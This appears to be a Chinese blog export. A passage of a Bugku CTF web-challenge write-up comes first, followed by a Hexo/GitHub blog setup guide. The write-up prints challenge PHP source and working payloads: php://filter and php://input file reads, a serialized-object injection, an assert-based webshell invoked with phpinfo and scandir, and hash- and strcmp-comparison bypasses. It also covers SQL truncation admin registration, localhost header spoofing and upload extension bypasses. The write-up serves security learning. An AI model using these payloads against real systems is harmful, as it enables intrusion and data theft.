<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a=<span class="string">"%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI</span></span><br><span class="line"><span class="string">3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU</span></span><br><span class="line"><span class="string">zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ</span></span><br><span class="line"><span class="string">lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q</span></span><br><span class="line"><span class="string">lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI</span></span><br><span class="line"><span class="string">5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN</span></span><br><span class="line"><span class="string">CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5</span></span><br><span class="line"><span class="string">0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU</span></span><br><span class="line"><span class="string">yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R</span></span><br><span class="line"><span class="string">ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ</span></span><br><span class="line"><span class="string">DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI</span></span><br><span class="line"><span class="string">xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU</span></span><br><span class="line"><span class="string">wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB</span></span><br><span class="line"><span class="string">1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urllib.unquote(a)</span><br></pre></td></tr></table></figure>

<p>这里面出来的是base64编码的东西，解码得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">        exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">        return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');//file_get_contents - 将整个文件读入字符串</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">//eregi是正则匹配函数</span></span><br><span class="line"><span class="string">        require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 其实直接在url里面写一个f4l2a3g.txt就可以得到flag了</p>
<ul>
<li><p>正解如下：</p>
<p>题目的意思是要满足以下条件：</p>
</li>
<li><p>id不等于0</p>
</li>
<li><p>id弱等于0，那么查看php的表格发现字符串弱等于0，所以让id=“ijk”</p>
</li>
<li><p>b的第一个字符不等于4，又要让“111”.substr(b,0,1)和“1114”匹配起来。eregi函数可以用截断字符\x00绕过<br> 但是注意在输入url的时候\x00会被转码，导致url被截断。注意，虽然 b=%0012345 实际字符串长度为 8 字节，<br> 但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现，<br> 而不是在 URL 查询字符串变量中出现。</p>
</li>
</ul>
<ul>
<li>$data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。<br>在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。<br>伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。</li>
</ul>
<p>所以构造如下：</p>
<pre><code>id=&quot;int&quot;&amp;b=%0012345&amp;a=php://input 并在burp的请求头中添加bugku is a nice plateform!</code></pre><h2 id="welcome-to-the-bugkuctf"><a href="#welcome-to-the-bugkuctf" class="headerlink" title="welcome to the bugkuctf"></a>welcome to the bugkuctf</h2><p>进入源代码界面，file_get_contents说明得是数据流，看到hint.php,然后再检索框里面输入：</p>
<pre><code>index.php?txt=php://input&amp;file=hint.php
并且在burpsuite中添加welcome to thebugkuctf</code></pre><p>得到的只是hint.php的效果界面，要看到hint的源码，要这样输入</p>
<pre><code>index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code></pre><p>  输出一堆base64编码，解码得到</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样的道理，使用<br>index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>解码得到了index.php的源代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>

<p> 显然这里不让我们再file中输入flag文件名。但是Flag类在构造对象的时候会执行构造函数，这个时候<br> 有机会echo出我们要的文件。但是要怎么利用password来传入我们要的对象呢？看到了unseialize反序列函数<br> 这个函数可以把对象从序列化的字符串还原出对象来.在PHP中,序列化用于存储或传递<em>PHP 的值</em>的过程中,同时不丢失其类型和结构</p>
<p> 所以我们编写如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $file=<span class="string">'flag.php'</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p>于是传入参数index.php?txt=welcome to the bugkuctf&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p>得到flag</p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>刚开始给我们的php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $poc=<span class="string">"a#s#s#e#r#t"</span>;</span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc);</span><br><span class="line">$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看意思explode就是根据第一参数的规则将目标划分为一个数组。那么pro2就是assert的意思<br>assert（）一个东西，如果字符串会被当做代码执行，否则是false</p>
<p>以下解法<br>    试探一下：?index.php?s=phpinfo();//可以正常执行<br>    ?index.php?s=print_r(scandir(./)) //./的意思应该是在当前目录下，scan扫描目录文件返回一个数组</p>
<pre><code>显示了flag所处的txt文件夹，之后用var_dump()或者show_source()或者直接访问都可以</code></pre><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>打开网页，要求匹配的正则式子如下：</p>
<pre><code>/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i</code></pre><ul>
<li><p>/。。。。/这对东西标志正则表达式的开头和结尾，类似的还有#。。。#等</p>
</li>
<li><p>[[:punct:]] ：匹配任何标点符号；</p>
</li>
<li><p>/i  ：表示这个正则表达式对大小写不敏感；<br>一开始我写的匹配对象是这样的：</p>
<pre><code>http://123.206.87.240:8002/web10/?id=keykey00000key://keyb.</code></pre></li>
</ul>
<p>但是失败原因是在最后两个斜杠上，他们在url输入的时候前一个会充当转义作用，实际输入的只有一个/<br>变成这样就好了：</p>
<pre><code>http://123.206.87.240:8002/web10/?id=keykey00000key:///keyb.</code></pre><h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p>打开源代码，发现在链接处有个链接，点进入是php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于这里的md5，既可以采用md5碰撞的方法，也可以让两个变量都在输入的时候声明为数组得到false=false<br>，对于这里的strcmp可以试试把v3声明为一个不符合数据类型的东西比如说整数，这样可以让函数返回0(仅对php5.3之前版本有效)</p>
<pre><code>http://123.206.31.85:49162/index.php?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1

或者

http://123.206.31.85:49162/index.php?v1[]=1&amp;v2[]=2&amp;v3[]=1</code></pre><h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>打开之后是登陆界面，提示说是sql约束攻击，具体博客教程看这里<a href="https://blog.csdn.net/wy_97/article/details/77972375" target="_blank" rel="noopener">sql约束攻击</a></p>
<p>总而言之为了创建一个新的admin，我们注册以下账户：</p>
<pre><code>username：admin                                            1
password：2017zxwlB</code></pre><ul>
<li><p>注册的时候，会首先查看是否有相同的用户名，但是因为select查询语句并不对超出最大长度限<br>制的检索对象进行尾部修剪，所以在这种情况下，我们注册的用户名在数据库中并不存在。</p>
</li>
<li><p>既然不存在，就会向表中插入这条新的用户数据，但是由于超出了varchar()所规定的长度，所以<br>超出部分会被截断，这是第一重处理，接下来数据库会把有效字符后面的空格都删掉，这是第二重处理<br>由此我们插入了一个admin用户，使用的是自己的密码就可以登陆</p>
</li>
</ul>
<p>登陆就好了。</p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目说 你是从谷歌来的吗？，在burpsuite中添加referer:<a href="https://www.google.com就可以了" target="_blank" rel="noopener">https://www.google.com就可以了</a></p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>从历史write up中记录的转化后的值为0的md5码中选两个出来作为参数就可以了</p>
<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>要求从本地访问，在burpsuite中添加一条x-forwarded-for:127.0.0.1就可以了！</p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>打开网页之后看到的代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">   <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line"></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>sha1是散列算法函数，返回散列值。这里传入两个不符合数据类型的数据来让两个都返回false就可以做到相等<br>，那么就让uname声明成为一个数组，并且用hackbar传一个数组类型的passwd进去。id=margin就行了。</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>打开网站显示代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);<span class="comment">//解析所有通过get方式获取的变量</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));<span class="comment">//从打开fn所代表的文件，或者是文件流</span></span><br><span class="line"><span class="keyword">if</span> ($ac === $f)<span class="comment">//强等于</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可知有两种解法：</p>
<ul>
<li><p>解法一：利用php://input传入fn一个值并让他和ac相等(这里很奇怪我的hackbar不能给php://input传数据，但是burpsuite应该可以)</p>
</li>
<li><p>解法二：根据题目提示，猜测有flag.txt在同级目录下，访问之看到文件内容显示flags，<br>那么让ac=flags，fn=flag.txt就可以得到flag了。</p>
</li>
</ul>
<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>使用御剑软件扫描网站，发现有robots.txt,点进去显示</p>
<pre><code>User-agent: *
Disallow: /resusl.php</code></pre><p>访问这个php文件试试，看到了显示里头警告不是管理员登陆，自己的ip已经被记录，第一反应是伪造本地访问</p>
<pre><code>Host: 127.0.0.1
Referer: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1</code></pre><p>这几种方式都可以在burpsuite中进行修改来伪造本地访问。(但是题目的考点似乎并不在此)</p>
<p>接下来显示</p>
<pre><code>By bugkuctf.

if ($_GET[x]==$password) 此处省略1w字</code></pre><p>试一试把x赋值成admin试一试？刚开始题目的文字信息就让我们试试构造了admin，果然有了flag</p>
<pre><code>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访
问的部分，或者指定搜索引擎只收录指定的内容。
当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时器人就会按照该文件中的内容来
确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。</code></pre><h2 id="求getshell（文件上传类型）"><a href="#求getshell（文件上传类型）" class="headerlink" title="求getshell（文件上传类型）"></a>求getshell（文件上传类型）</h2><p>打开页面，要求发送图片文件而不是php文件。看网上说是黑名单过滤和类型检测，但是可以把<br>content-type 进行大小写绕过和类型修改，并且修改php文件的后缀名，可以修改成以下几种</p>
<pre><code>php2, php3, php4, php5, phps, pht, phtm, phtml</code></pre><p>试了以上几种之后，php5可以拿到flag。</p>
]]></content>
  </entry>
  <entry>
    <title>使用hexo和github搭建网站</title>
    <url>/2019/04/22/%E9%80%82%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<blockquote>
<p>这篇文章主要记录使用hexo和github搭建网站的过程，参考了很多博客</p>
</blockquote>
<h2 id="node-js安装-使用nvm"><a href="#node-js安装-使用nvm" class="headerlink" title="node.js安装(使用nvm)"></a>node.js安装(使用nvm)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.34.0/install.sh | bash</span><br><span class="line"></span><br><span class="line"># switch node version</span><br><span class="line"># set the newest version as default</span><br><span class="line">nvm use node</span><br><span class="line">nvm alias default node</span><br></pre></td></tr></table></figure>

<h2 id="npm-install"><a href="#npm-install" class="headerlink" title="npm install"></a>npm install</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p>see the link below:</p>
<p><a href="https://npm.taobao.org/" target="_blank" rel="noopener">https://npm.taobao.org/</a></p>
<h2 id="hexo-安装"><a href="#hexo-安装" class="headerlink" title="hexo 安装"></a>hexo 安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir blog</span><br><span class="line">cd blog</span><br><span class="line">mkdir hexo</span><br><span class="line">cd hexo </span><br><span class="line">cnpm install hexo-cli -g</span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>访问4000端口就可以看见博客了</p>
<h2 id="网站个人信息修改"><a href="#网站个人信息修改" class="headerlink" title="网站个人信息修改"></a>网站个人信息修改</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#在example.github.io目录下</span><br><span class="line">vim _config.yml</span><br><span class="line">在这里修改：</span><br><span class="line"></span><br><span class="line">title:</span><br><span class="line">subtitle:</span><br><span class="line">description:</span><br><span class="line">.......</span><br><span class="line"># vim 快速查找用/keyword ，按n下一个</span><br></pre></td></tr></table></figure>

<h2 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h2><p>个人比较喜欢next</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next</span><br></pre></td></tr></table></figure>

<p>进入themes目录下的新主题目录中，查看<code>_config.yml</code> 文件,修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theme:hexo-theme-next</span><br></pre></td></tr></table></figure>

<p>然后进入hexo-theme-next目录下的<code>_config.yml</code>文件，依据个人偏好修改风格：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line"># scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br><span class="line"># 选择一个喜欢的，去掉#即可</span><br></pre></td></tr></table></figure>

<p>重新生成运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>再次访问即可看到效果</p>
<h2 id="修枝剪叶"><a href="#修枝剪叶" class="headerlink" title="修枝剪叶"></a>修枝剪叶</h2><p>要想设置右侧栏(我用的是Gemini)的头像，进入主题配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sidebar avatar</span><br><span class="line">avatar: /images/header.jpg</span><br></pre></td></tr></table></figure>

<p>将header.jpg放在主题文件夹下的images中即可。</p>
<p>修改联系方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#主题文件夹中的_config.yml文件</span><br><span class="line">social:</span><br><span class="line">  github: https://github.com/your-user-name</span><br><span class="line">  twitter: https://twitter.com/your-user-name</span><br><span class="line">  #还有很多</span><br></pre></td></tr></table></figure>

<h2 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h2><p>在你的github账户上创建仓库<code>yourusername.github.io</code>，必须是用户名开头命名，否则<code>github page</code>不会生效。</p>
<h3 id="密钥部署"><a href="#密钥部署" class="headerlink" title="密钥部署"></a>密钥部署</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class="line">然后将公钥粘贴进github账户的个人设置里面</span><br><span class="line">ssh -T git@github.com</span><br><span class="line">git config --global user.name &quot;username&quot;</span><br><span class="line">git config --global user.email &quot;email&quot;</span><br></pre></td></tr></table></figure>

<h3 id="安装hexo-deployer-git"><a href="#安装hexo-deployer-git" class="headerlink" title="安装hexo-deployer-git"></a>安装hexo-deployer-git</h3><p>在博客目录下下载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>修改网站根目录下的_config.yml文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">	type: git#注意git的前面要加空格否则不生效</span><br><span class="line">   repo: https://github.com/example/example.github.io.git</span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>

<p>保存退出后执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br><span class="line">hexo d #部署</span><br></pre></td></tr></table></figure>

<h2 id="使用hexo-admin写博客-abandoned-and-use-typora-instead"><a href="#使用hexo-admin写博客-abandoned-and-use-typora-instead" class="headerlink" title="使用hexo-admin写博客(abandoned, and use typora instead)"></a>使用hexo-admin写博客(abandoned, and use typora instead)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>访问<code>url/admin</code>即可编辑博客</p>
<h2 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h2><p>在主题的<code>_config.yml</code>文件里面的link项目里面设置即可。</p>
<h2 id="站内搜索"><a href="#站内搜索" class="headerlink" title="站内搜索"></a>站内搜索</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>修改主题的配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 3</span><br></pre></td></tr></table></figure>

<h2 id="粒子效果添加"><a href="#粒子效果添加" class="headerlink" title="粒子效果添加"></a>粒子效果添加</h2><p><a href="https://github.com/theme-next/theme-next-canvas-nest" target="_blank" rel="noopener">https://github.com/theme-next/theme-next-canvas-nest</a></p>
<p>配置文件可能有所不同,把false改成true就可以了</p>
<h2 id="显示更新时间"><a href="#显示更新时间" class="headerlink" title="显示更新时间"></a>显示更新时间</h2><p>主题配置文件中的<code>update_at</code> 修改为true</p>
<h2 id="统计功能"><a href="#统计功能" class="headerlink" title="统计功能"></a>统计功能</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure>

<p>修改<code>post_wordcount</code></p>
<h2 id="顶部加载条"><a href="#顶部加载条" class="headerlink" title="顶部加载条"></a>顶部加载条</h2><p>在<code>/themes/next/layout/_partials/head.swig</code> 中修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=&quot;UTF-8&quot;/&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;/&gt;</span><br><span class="line">在这后面添加</span><br><span class="line">&lt;script src=&quot;//cdn.bootcss.com/pace/1.0.2/pace.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;link href=&quot;//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-flash.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="主页添加阴影"><a href="#主页添加阴影" class="headerlink" title="主页添加阴影"></a>主页添加阴影</h2><p>打开主题文件下的<code>\source\css\_custom\custom.styl</code>,向里面加入：</p>
